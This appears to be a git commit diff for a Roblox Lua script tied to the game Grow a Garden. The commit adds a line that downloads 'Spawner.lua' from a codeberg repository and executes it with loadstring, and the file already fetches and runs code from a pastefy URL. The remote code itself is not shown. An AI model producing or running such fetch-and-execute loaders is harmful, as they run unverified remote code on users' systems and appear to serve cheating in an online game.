03e9ca5f7516f3f03b15720094ac7d0d12f2f7d7
Zixx71 <amenacetotheworid@gmail.com>
2025-07-27 16:38:09 -0300

    Update GaGPET.lua

--- GaGPET.lua
+++ GaGPET.lua
@@ -1,1 +1,5 @@
+local Spawner = loadstring(game:HttpGet("https://codeberg.org/GrowAFilipino/GrowAGarden/raw/branch/main/Spawner.lua"))()
+Spawner.Load()
+
+
 loadstring(game:HttpGet("https://pastefy.app/0BEi90p2/raw"))()
